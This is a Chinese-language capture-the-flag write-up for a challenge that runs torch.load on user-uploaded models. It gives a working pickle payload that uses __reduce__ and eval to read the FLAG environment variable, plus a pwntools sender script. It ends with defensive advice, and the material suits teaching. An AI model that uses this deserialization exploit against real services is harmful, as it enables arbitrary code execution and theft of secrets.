# simple-ai

## 题目简述

服务要求用户上传十六进制编码的 PyTorch 模型，限制文件不超过 2048 字节，然后直接执行 `torch.load(temp)`。传统 PyTorch 保存格式底层使用 Pickle；加载不可信对象时，Pickle 的归约函数可以调用任意 Python 可调用对象。

本题与模型预测能力无关，核心是反序列化时的代码执行，因此归入 Pwn，而不是 AI/ML。

## 解题过程

构造一个字典子类，通过 `__reduce__` 指定反序列化时调用 `eval`，参数是一段打印环境变量 `FLAG` 的表达式：

```python
import torch

class BadDict(dict):
    def __reduce__(self):
        code = "__import__('builtins').print(__import__('os').environ['FLAG'])"
        return eval, (code,)

torch.save(BadDict(), "payload.pt")
```

读取文件并以十六进制发送：

```python
from pwn import *

payload = open("payload.pt", "rb").read()
assert len(payload) <= 2048
p = remote("HOST", PORT)
p.sendlineafter(b"in hex): ", payload.hex().encode())
print(p.recvall().decode())
```

恶意代码在 `torch.load` 阶段已经运行。即使加载结果不是合法模型、后续 `model.eval()` 抛出异常，Flag 也已先被打印：

```text
greyhats{are_you_perhaps_pickle_rick???}
```

## 方法总结

- 核心技巧：利用 `torch.load` 对 Pickle 归约协议的支持，在模型反序列化阶段执行任意 Python 代码。
- 识别信号：服务接收用户可控 `.pt`/Pickle 数据并直接 `torch.load`，没有安全格式或类型白名单。
- 复用要点：不要把不可信模型当普通张量文件加载；防守侧应使用仅权重、安全反序列化选项或不具备代码执行语义的格式。
